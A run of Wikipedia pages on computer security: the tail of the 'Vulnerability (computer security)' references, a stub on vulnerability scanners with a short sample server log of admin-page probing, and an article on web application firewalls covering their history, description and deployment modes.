. Morgan Kaufmann Publications. Elsevier Inc. p. 393. 
ISBN
 
978-0-12-374354-1
.




^
 
Krsul, Ivan (April 15, 1997). 
Technical Report CSD-TR-97-026
. The COAST Laboratory Department of Computer Sciences, Purdue University. 
CiteSeerX
 
10.1.1.26.5435
.




^
 
Linkov & Kott 2019
, p. 2.




^
 
Haber & Hibbert 2018
, p. 155.




^
 
Strout 2023
, p. 17.




^
 
Haber & Hibbert 2018
, p. 143.




^
 
Haber & Hibbert 2018
, p. 141.




^
 
Haber & Hibbert 2018
, p. 142.




^
 
Haber & Hibbert 2018
, pp. 135–137.




^
 
Garg & Baliyan 2023
, pp. 17–18.




^ 
a
 
b
 
Garg & Baliyan 2023
, p. 17.




^ 
a
 
b
 
c
 
Garg & Baliyan 2023
, p. 18.




^
 
Salmani 2018
, p. 1.




^
 
Salmani 2018
, p. 11.




^
 
Garg & Baliyan 2023
, pp. 20–25.




^
 
Sharp 2024
, p. 271.




^ 
a
 
b
 
c
 
Strout 2023
, p. 15.




^ 
a
 
b
 
c
 
d
 
Strout 2023
, p. 13.




^
 
Haber & Hibbert 2018
, p. 129.




^ 
a
 
b
 
c
 
d
 
e
 
Strout 2023
, p. 14.




^
 
Strout 2023
, pp. 14–15.




^
 
Agrafiotis 
et al.
 2018
, p. 2.




^ 
a
 
b
 
Haber & Hibbert 2018
, pp. 97–98.




^
 
Tjoa 
et al.
 2024
, p. 63.




^
 
Tjoa 
et al.
 2024
, pp. 68, 70.




^
 
Magnusson 2020
, p. 34.




^
 
Haber & Hibbert 2018
, pp. 166–167.




^ 
a
 
b
 
c
 
Haber & Hibbert 2018
, p. 11.




^ 
a
 
b
 
c
 
Strout 2023
, p. 8.




^
 
Haber & Hibbert 2018
, pp. 12–13.




^ 
a
 
b
 
Haber & Hibbert 2018
, p. 84.




^
 
Haber & Hibbert 2018
, p. 85.




^
 
Haber & Hibbert 2018
, pp. 84–85.




^
 
Magnusson 2020
, p. 32.




^
 
Magnusson 2020
, p. 33.




^
 
Haber & Hibbert 2018
, p. 93.




^ 
a
 
b
 
Haber & Hibbert 2018
, p. 96.




^
 
Haber & Hibbert 2018
, p. 94.




^
 
Strout 2023
, p. 16.




^ 
a
 
b
 
Strout 2023
, p. 18.




^
 
Libicki, Ablon & Webb 2015
, p. 44.




^
 
Perlroth 2021
, p. 145.




^
 
Libicki, Ablon & Webb 2015
, pp. 44, 46.




^
 
Ablon & Bogart 2017
, p. 8.




^ 
a
 
b
 
c
 
d
 
Sood & Enbody 2014
, p. 42.




^
 
Strout 2023
, p. 26.




^
 
Libicki, Ablon & Webb 2015
, p. 50.




^ 
a
 
b
 
Libicki, Ablon & Webb 2015
, pp. 49–50.




^
 
Strout 2023
, p. 28.




^
 
Strout 2023
, p. 19.




^
 
Strout 2023
, pp. 5–6.




^
 
Haber & Hibbert 2018
, pp. 73–74.




^
 
"Ask an Ethicist: Vulnerability Disclosure"
. 
Association for Computing Machinery
's Committee on Professional Ethics
. 17 July 2018
. Retrieved 
3 May
 2024
.




^
 
O'Harrow 2013
, p. 18.




^
 
Libicki, Ablon & Webb 2015
, p. 45.




^
 
Strout 2023
, p. 36.




^ 
a
 
b
 
Haber & Hibbert 2018
, p. 110.




^
 
Strout 2023
, p. 22.




^ 
a
 
b
 
Strout 2023
, p. 6.




^
 
Sloan & Warner 2019
, pp. 104–105.




^
 
Haber & Hibbert 2018
, p. 111.






Sources
[
edit
]




Ablon, Lillian; Bogart, Andy (2017). 
Zero Days, Thousands of Nights: The Life and Times of Zero-Day Vulnerabilities and Their Exploits
 
(PDF)
. Rand Corporation. 
ISBN
 
978-0-8330-9761-3
.


Agrafiotis, Ioannis; Nurse, Jason R C; Goldsmith, Michael; Creese, Sadie; Upton, David (2018). "A taxonomy of cyber-harms: Defining the impacts of cyber-attacks and understanding how they propagate". 
Journal of Cybersecurity
. 
4
 (1). 
doi
:
10.1093/cybsec/tyy006
. 
ISSN
 
2057-2085
.


Daswani, Neil
; Elbayadi, Moudy (2021). 
Big Breaches: Cybersecurity Lessons for Everyone
. Apress. 
ISBN
 
978-1-4842-6654-0
.


Garg, Shivi; Baliyan, Niyati (2023). 
Mobile OS Vulnerabilities: Quantitative and Qualitative Analysis
. CRC Press. 
ISBN
 
978-1-000-92451-0
.


Haber, Morey J.; Hibbert, Brad (2018). 
Asset Attack Vectors: Building Effective Vulnerability Management Strategies to Protect Organizations
. Apress. 
ISBN
 
978-1-4842-3627-7
.


Libicki, Martin C.; Ablon, Lillian; Webb, Tim (2015). 
The Defender’s Dilemma: Charting a Course Toward Cybersecurity
 
(PDF)
. Rand Corporation. 
ISBN
 
978-0-8330-8911-3
.


Linkov, Igor; Kott, Alexander (2019). "Fundamental Concepts of Cyber Resilience: Introduction and Overview". 
Cyber Resilience of Systems and Networks
. Springer International Publishing. pp. 1–25. 
ISBN
 
978-3-319-77492-3
.


Magnusson, Andrew (2020). 
Practical Vulnerability Management: A Strategic Approach to Managing Cyber Risk
. No Starch Press. 
ISBN
 
978-1-59327-989-9
.


O'Harrow, Robert (2013). 
Zero Day: The Threat In Cyberspace
. Diversion Books. 
ISBN
 
978-1-938120-76-3
.


Perlroth, Nicole (2021). 
This Is How They Tell Me the World Ends: Winner of the FT & McKinsey Business Book of the Year Award 2021
. Bloomsbury Publishing. 
ISBN
 
978-1-5266-2983-8
.


Salmani, Hassan (2018). 
Trusted Digital Circuits: Hardware Trojan Vulnerabilities, Prevention and Detection
. Springer. 
ISBN
 
978-3-319-79081-7
.


Seaman, Jim (2020). 
PCI DSS: An Integrated Data Security Standard Guide
. Apress. 
ISBN
 
978-1-4842-5808-8
.


Sharp, Robin (2024). 
Introduction to Cybersecurity: A Multidisciplinary Challenge
. Springer Nature. 
ISBN
 
978-3-031-41463-3
.


Sloan, Robert H.; Warner, Richard (2019). 
Why Don't We Defend Better?: Data Breaches, Risk Management, and Public Policy
. CRC Press. 
ISBN
 
978-1-351-12729-5
.


Sood, Aditya; Enbody, Richard (2014). 
Targeted Cyber Attacks: Multi-staged Attacks Driven by Exploits and Malware
. Syngress. 
ISBN
 
978-0-12-800619-1
.


Strout, Benjamin (2023). 
The Vulnerability Researcher's Handbook: A comprehensive guide to discovering, reporting, and publishing security vulnerabilities
. Packt Publishing. 
ISBN
 
978-1-80324-356-6
.


Tjoa, Simon; Gafić, Melisa; Kieseberg, Peter (2024). 
Cyber Resilience Fundamentals
. Springer Nature. 
ISBN
 
978-3-031-52064-8
.




External links
[
edit
]


 Media related to 
Vulnerability (computing)
 at Wikimedia Commons


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Vulnerability_(computer_security)&oldid=1235399004
"


Categories
: 
Vulnerability
Hacking (computer security)
Security compliance
Software testing
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles containing potentially dated statements from 2023
All articles containing potentially dated statements
All articles with unsourced statements
Articles with unsourced statements from May 2024
Commons category link from Wikidata











From Wikipedia, the free encyclopedia






Probes computer systems for known security problems


You can help 
expand this article with text translated from 
the corresponding article
 in French
.  
(June 2020)
 
Click [show] for important translation instructions.


View
 a machine-translated version of the French article.


Machine translation, like 
DeepL
 or 
Google Translate
, is a useful starting point for translations, but translators must revise errors as necessary and confirm that the translation is accurate, rather than simply copy-pasting machine-translated text into the English Wikipedia.


Consider 
adding a topic
 to this template: there are already 1,433 articles in the 
main category
, and specifying
|topic=
 will aid in categorization.


Do not translate text that appears unreliable or low-quality. If possible, verify the text with references provided in the foreign-language article.


You 
must
 provide 
copyright attribution
 in the 
edit summary
 accompanying your translation by providing an 
interlanguage link
 to the source of your translation. A model attribution edit summary is 
Content in this edit is translated from the existing French Wikipedia article at [[:fr:Scanner de vulnérabilité]]; see its history for attribution.


You may also add the template 
{{Translated|fr|Scanner de vulnérabilité}}
 to the 
talk page
.


For more guidance, see 
Wikipedia:Translation
.


A 
vulnerability scanner
 is a 
computer program
 designed to assess 
computers
, 
networks
 or 
applications
 for known weaknesses.  These scanners are used to discover the weaknesses of a given system. They are used in the identification and detection of vulnerabilities arising from mis-configurations or flawed programming within a network-based asset such as a firewall, router, web server, application server, etc. Modern vulnerability scanners allow for both authenticated and unauthenticated scans.  Modern scanners are typically available as SaaS (
Software as a Service
); provided over the internet and delivered as a web application. The modern vulnerability scanner often has the ability to customize vulnerability reports as well as the installed software, open ports, certificates and other host information that can be queried as part of its workflow. 



Authenticated scans
 allow for the scanner to directly access network based assets using remote administrative protocols such as 
secure shell
 (SSH) or 
remote desktop protocol
 (RDP) and authenticate using provided system credentials. This allows the vulnerability scanner to access low-level data, such as specific services and configuration details of the host operating system. It's then able to provide detailed and accurate information about the operating system and installed software, including configuration issues and missing security patches.
[
1
]


Unauthenticated scans
 is a method that can result in a high number of false positives and is unable to provide detailed information about the assets operating system and installed software. This method is typically used by threat actors or security analyst trying determine the security posture of externally accessible assets.
[
1
]


Vulnerability scanners should be able to detect the risks in open-source dependencies. However, since developers will usually re-bundle the OSS, the same code will appear in different dependencies, which will then impact the performance and ability of scanners to detect the vulnerable OSS.
[
2
]


The 
CIS Critical Security Controls for Effective Cyber Defense
 designates continuous vulnerability scanning as a critical control for effective cyber defense.





Part of a server log, showing attempts by a scanner to find the administration page.




220.128.235.XXX - - [26/Aug/2010:03:00:09 +0200] "GET /db/db/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:09 +0200] "GET /db/myadmin/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:10 +0200] "GET /db/webadmin/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:10 +0200] "GET /db/dbweb/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:11 +0200] "GET /db/websql/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:11 +0200] "GET /db/webdb/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:13 +0200] "GET /db/dbadmin/main.php HTTP/1.0" 404 - "-" "-"
220.128.235.XXX - - [26/Aug/2010:03:00:13 +0200] "GET /db/db-admin/main.php HTTP/1.0" 404 - "-" "-"
 (..)







See also
[
edit
]


Cybersecurity


Browser security


Computer emergency response team


Information security


Internet security


Mobile security


Dynamic application security testing


Penetration testing


Pentesting software toolkits


◦ 
OpenVAS


◦ 
Nessus


◦ 
Metasploit Project


◦ 
Snort


References
[
edit
]






^ 
a
 
b
 
National Institute of Standards and Technology (September 2008). 
"Technical Guide to Information Security Testing and Assessment"
 
(PDF)
. 
NIST
. 
Archived
 
(PDF)
 from the original on 2021-10-27
. Retrieved 
2017-10-05
.




^
 
Dann, Andreas; Plate, Henrik; Hermann, Ben; Ponta, Serena Elisa; Bodden, Eric (2022-09-01). 
"Identifying Challenges for OSS Vulnerability Scanners - A Study & Test Suite"
. 
IEEE Transactions on Software Engineering
. 
48
 (9): 3613–3625. 
doi
:
10.1109/TSE.2021.3101739
. 
ISSN
 
0098-5589
. 
S2CID
 
238808679
. 
Archived
 from the original on 2024-06-06
. Retrieved 
2023-11-10
.






External links
[
edit
]


Web Application [need link to legit site, old site was hoax]



National Institute of Standards and Technology (NIST) Publication of their Security Content Automation Protocol (
SCAP
) outline.


This 
computer networking
 article is a 
stub
. You can help Wikipedia by 
expanding it
.
v
t
e


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Vulnerability_scanner&oldid=1238276453
"


Categories
: 
Computer network stubs
Computer security software
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles needing translation from French Wikipedia
All stub articles











From Wikipedia, the free encyclopedia






HTTP specific network security system


This article is about a sub-type of an application firewall. For the article on application firewalls, see 
Application firewall
. For the primary topic of  firewalls, see 
Firewall (computing)
.


A 
web application firewall
 (
WAF
) is a specific form of 
application firewall
 that filters, monitors, and blocks 
HTTP
 
traffic
 to and from a 
web service
. By inspecting HTTP traffic, it can prevent attacks exploiting a web application's known vulnerabilities, such as 
SQL injection
, 
cross-site scripting
 (XSS), 
file inclusion
, and improper system configuration.
[
1
]
 Most of the major financial institutions utilize WAFs to help in the mitigation of web application 'zero-day' vulnerabilities,
[
citation needed
]
 as well as hard to patch bugs or weaknesses through custom attack signature strings.
[
2
]






History
[
edit
]


See also: 
Application firewall


Dedicated web application firewalls entered the market in the late 1990s during a time when 
web server
 
attacks
 were becoming more prevalent.

An early version of WAF was developed by 
Perfecto Technologies
 with its 
AppShield
 product,
[
3
]
 which focused on the e-commerce market and protected against illegal web page character entries. Other early WAF products, from Kavado and Gilian technologies, were available in the market at the same time, trying to solve the increasing amount of attacks on web applications in the late 90s. In 2002, the open source project 
ModSecurity
[
4
]
 was formed in order to make WAF technology more accessible. They finalized a core rule set for protecting web applications, based on OASIS Web Application Security Technical Committee’s (WAS TC) vulnerability work. In 2003, they expanded and standardized rules through the 
Open Web Application Security Project
’s (OWASP) Top 10 List, an annual ranking for web security vulnerabilities. This list would become the industry standard for web application security compliance.
[
5
]
[
6
]


Since then, the market has continued to grow and evolve, especially focusing on 
credit card fraud
 prevention. With the development of the 
Payment Card Industry Data Security Standard
 (PCI DSS), a standardization of control over cardholder data,  security has become more regulated in this sector. According to CISO Magazine, the WAF market was expected to grow to $5.48 billion by 2022.
[
7
]
[
8
]




Description
[
edit
]


A web application firewall is a special type of application firewall that applies specifically to web applications. It is deployed in front of web applications and analyzes bi-directional web-based (HTTP) traffic - detecting and blocking anything malicious. The OWASP provides a broad technical definition for a WAF as  “a security solution on the web application level which - from a technical point of view - does not depend on the application itself.”
[
9
]
 According to the PCI DSS Information Supplement for requirement 6.6, a WAF is defined as “a security policy enforcement point positioned between a web application and the client endpoint. This functionality can be implemented in software or hardware, running in an appliance device, or in a typical server running a common operating system. It may be a stand-alone device or integrated into other network components.”
[
10
]
 In other words, a WAF can be a virtual or physical appliance that prevents vulnerabilities in web applications from being exploited by outside threats. These vulnerabilities may be because the application itself is a legacy type or it was insufficiently coded by design. The WAF addresses these code shortcomings by special configurations of rule-sets, also known as policies.

Previously unknown vulnerabilities can be discovered through penetration testing or via a vulnerability scanner. A 
web application vulnerability scanner
, also known as a web application security scanner, is defined in the 
SAMATE
 
NIST
 500-269 as “an automated program that examines web applications for potential security vulnerabilities. In addition to searching for web application-specific vulnerabilities, the tools also look for software coding errors.”
[
11
]
 Resolving vulnerabilities is commonly referred to as remediation. Corrections to the code can be made in the application but typically a more prompt response is necessary. In these situations, the application of a custom policy for a unique web application vulnerability to provide a temporary but immediate fix (known as a virtual patch) may be necessary.

WAFs are not an ultimate security solution, rather they are meant to be used in conjunction with other network perimeter security solutions such as network firewalls and intrusion prevention systems to provide a holistic defense strategy.

WAFs typically follow a positive security model, a negative security, or a combination of both as mentioned by the 
SANS Institute
.
[
12
]
 WAFs use a combination of rule-based logic, 
parsing
, and signatures to detect and prevent attacks such as cross-site scripting and SQL injection. In general, features like browser emulation, obfuscation and virtualization as well as IP obfuscation are used to attempt to bypass WAFs.
[
13
]
 The OWASP produces a list of the top ten web application security flaws. All commercial WAF offerings cover these ten flaws at a minimum. There are non-commercial options as well. As mentioned earlier, the well-known open source WAF engine called ModSecurity is one of these options. A WAF engine alone is insufficient to provide adequate protection, therefore OWASP along with Trustwave's Spiderlabs help organize and maintain a Core-Rule Set via 
GitHub
[
14
]
 to use with the ModSecurity WAF engine.
[
15
]




Deployment options
[
edit
]


Although the names for operating mode may differ, WAFs are basically deployed inline in three different ways. According to NSS Labs, deployment options are 
transparent bridge
, transparent reverse proxy, and 
reverse proxy
.
[
16
]
 'Transparent' refers to the fact that the HTTP traffic is sent straight to the web application, therefore the WAF is transparent between the client and server. This is in contrast to reverse proxy, where the WAF acts as a proxy and the client’s traffic is sent directly to the WAF. The WAF then separately sends filtered traffic to web applications. This can provide additional benefits such as IP masking but may introduce disadvantages such as performance latencies.



See also
[
edit
]


Application firewall


Payment Card Industry Data Security Standard
 (PCI DSS)


Web application


Software as a service
 (SaaS)


Computer security


Network security


Application security


Web application security


References
[
edit
]






^
 
"Web Application Firewall"
. TechTarget
. Retrieved 
10 April
 2018
.




^
 
Detecting zero-days before zero-day




^
 
"Perfecto Technologies Delivers AppShield for E-Business - InternetNews"
. 
www.internetnews.com
. 27 August 1999
. Retrieved 
2016-09-20
.




^
 
"ModSecurity homepage"
. 
ModSecurity
.




^
 
DuPaul, Neil (25 April 2012). 
"What is OWASP? Guide to the OWASP Application Security Top 10"
. Veracode
. Retrieved 
10 April
 2018
.




^
 
Svartman, Daniel (12 March 2018). 
"The OWASP Top Ten and Today's Threat Landscape"
. ITProPortol
. Retrieved 
10 April
 2018
.




^
 
Harsh (2021-12-26). 
"Web Application Firewall (WAF) Market CAGR of 19.2% 2021"
. 
Firewall Authority
. Retrieved 
2021-12-26
.




^
 
"Web Application Firewall Market Worth $5.48 Billion by 2022"
. CISO Magazine. 5 October 2017. Archived from 
the original
 on 11 April 2018
. Retrieved 
10 April
 2018
.




^
 
Maximillan Dermann; Mirko Dziadzka; Boris Hemkemeier; Alexander Meisel; Matthias Rohr; Thomas Schreiber (July 7, 2008). 
"OWASP Best Practices: Use of Web Application Firewalls ver. 1.0.5"
. 
OWASP
. OWASP.




^
 
PCI Data Security Standards Council (October 2008). 
"Information Supplement: Application Reviews and Web Application Firewalls Clarified ver. 1.2"
 
(PDF)
. 
PCI DSS
. PCI DSS.




^
 
Paul E. Black; Elizabeth Fong; Vadim Okun; Romain Gaucher (January 2008). 
"NIST Special Publication 500-269 Software Assurance Tools: Web Application Security Scanner Functional Specification Version 1.0"
 
(PDF)
. 
SAMATE NIST
. SAMATE NIST.




^
 
Jason Pubal (March 13, 2015). 
"Web Application Firewalls - Enterprise Techniques"
 
(PDF)
. 
SANS Institute
. SANS Institute InfoSec Reading Room.




^
 
IPM (July 29, 2022). 
"Reverse Engineering how WAFs Like Cloudflare Identify Bots"
. 
IPM Corporation
. IPM Corporation.




^
 
"Core-Rule Set Project Repository"
. 
GitHub
. 30 September 2022.




^
 
"OWASP ModSecurity Core Rule Set Project"
. 
OWASP
.




^
 
"TEST METHODOLOGY Web Application Firewall 6.2"
. 
NSS Labs
. NSS Labs. Archived from 
the original
 on 2022-09-05
. Retrieved 
2018-05-03
.






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Web_application_firewall&oldid=1242672522
"


Categories
: 
Firewall software
Web applications
Hidden categories: 
Articles with short description
Short description matches Wikidata
All articles with unsourced statements
Articles with unsourced statements from July 2024



